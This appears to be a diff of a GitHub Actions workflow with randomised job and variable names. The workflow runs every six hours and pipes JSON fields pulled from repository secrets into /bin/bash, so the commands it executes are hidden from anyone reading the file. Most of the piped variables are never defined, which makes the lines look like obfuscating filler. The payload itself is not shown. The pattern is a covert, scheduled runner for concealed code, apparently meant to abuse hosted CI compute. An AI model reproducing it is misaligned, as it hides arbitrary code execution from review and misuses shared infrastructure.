@@ -1,8 +1,9 @@
 name: xianghuaguo3451
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
+    - cron: '8 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,17 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: xianghuaguo3451
         env:
-          ctuyk050: ${{ secrets.ctuyk050 }}
+          cbsny7: ${{ secrets.cbsny7 }}
         run: |
-          echo $ctuyk050 | jq -r .qg1 | /bin/bash
-          echo $pyzeg57 | jq -r .l95 | /bin/bash
-          echo $ulbr17 | jq -r .cdjy30 | /bin/bash
-          echo $jmwd55313 | jq -r .nbd3259 | /bin/bash
-          echo $mloj58 | jq -r .pqu873 | /bin/bash
-          echo $lx59679 | jq -r .wizg22439 | /bin/bash
-          echo $a67877 | jq -r .ftv55 | /bin/bash
-          echo $foo44626 | jq -r .raeu94 | /bin/bash
-          echo $n953 | jq -r .xtues24 | /bin/bash
-          echo $nswk192 | jq -r .urz2 | /bin/bash
-          echo $u50847 | jq -r .jlfpc327 | /bin/bash
+          echo $cbsny7 | jq -r .b07 | /bin/bash
+          echo $okne397 | jq -r .prdc960 | /bin/bash
+          echo $utamk465 | jq -r .k3 | /bin/bash
+          echo $avbcu24 | jq -r .xukj43 | /bin/bash
+          echo $n55959 | jq -r .agcmf66011 | /bin/bash
+          echo $ne9790 | jq -r .f32 | /bin/bash
 
